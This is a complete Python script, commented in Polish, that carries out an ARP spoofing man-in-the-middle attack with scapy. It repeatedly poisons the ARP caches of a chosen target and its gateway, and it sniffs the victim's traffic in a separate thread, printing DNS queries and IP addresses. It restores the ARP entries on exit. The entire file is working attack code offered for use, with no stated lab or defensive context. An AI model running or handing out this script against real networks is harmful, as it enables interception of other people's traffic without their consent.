import argparse
import time
from scapy.all import ARP, Ether, srp, send, sniff, get_if_hwaddr, conf, DNS, DNSQR, IP

# Funkcja do automatycznego pobierania adresu MAC atakującego
def get_mac_address():
    return get_if_hwaddr(conf.iface)

# Funkcja do uzyskania adresu MAC na podstawie adresu IP
def resolve_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[WARNING] Nie udało się znaleźć adresu MAC dla {ip}.")
        return None

# Funkcja do wysyłania pakietów ARP spoofing
def spoof(target_ip, target_mac, spoof_ip, attacker_mac):
    # Dodanie warstwy Ethernet z ustawionym docelowym adresem MAC
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    send(packet, verbose=False)

# Funkcja do przywracania prawidłowych wpisów ARP
def restore(destination_ip, destination_mac, source_ip, source_mac):
    packet = Ether(dst=destination_mac) / ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

# Funkcja sniffingu pakietów przesyłanych przez ofiarę
def packet_sniffer(interface):
    print("[*] Rozpoczynanie sniffingu pakietów...")
    
    def process_packet(packet):
        # Sprawdzanie, czy pakiet zawiera zapytanie DNS
        if packet.haslayer(DNS) and packet.haslayer(DNSQR):
            dns_query = packet[DNSQR].qname.decode("utf-8")
            print(f"[DNS] Zapytanie o domenę: {dns_query}")
        
        # Wyświetlanie informacji o pakietach IP
        elif packet.haslayer(IP):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            print(f"[IP] Od: {src_ip} Do: {dst_ip}")
    
    # Rozpoczęcie sniffingu
    sniff(iface=interface, prn=process_packet, store=False)

# Główna funkcja
def main(target_ip, gateway_ip):
    # Automatyczne pobranie adresu MAC atakującego
    attacker_mac = get_mac_address()
    print(f"[INFO] MAC adres atakującego: {attacker_mac}")
    
    # Pozyskiwanie adresów MAC celu i bramy
    target_mac = resolve_mac(target_ip)
    gateway_mac = resolve_mac(gateway_ip)
    
    # Sprawdzenie, czy uzyskano adresy MAC
    if target_mac is None or gateway_mac is None:
        print("[ERROR] Nie można kontynuować bez adresów MAC celu i/lub bramy.")
        return
    
    # Uruchomienie sniffingu pakietów w osobnym wątku
    from threading import Thread
    sniffer_thread = Thread(target=packet_sniffer, args=(conf.iface,))
    sniffer_thread.start()

    try:
        print("[*] Wysyłanie pakietów ARP...")
        while True:
            # Wysyłanie fałszywego pakietu ARP do celu
            spoof(target_ip, target_mac, gateway_ip, attacker_mac)
            # Wysyłanie fałszywego pakietu ARP do bramy
            spoof(gateway_ip, gateway_mac, target_ip, attacker_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Przywracanie sieci...")
        restore(target_ip, target_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[*] Przywrócono prawidłowe wpisy ARP.")

# Konfiguracja argumentów skryptu
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Skrypt ARP spoofing")
    parser.add_argument("target_ip", help="Adres IP celu")
    parser.add_argument("gateway_ip", help="Adres IP bramy")
    args = parser.parse_args()
    
    main(args.target_ip, args.gateway_ip)
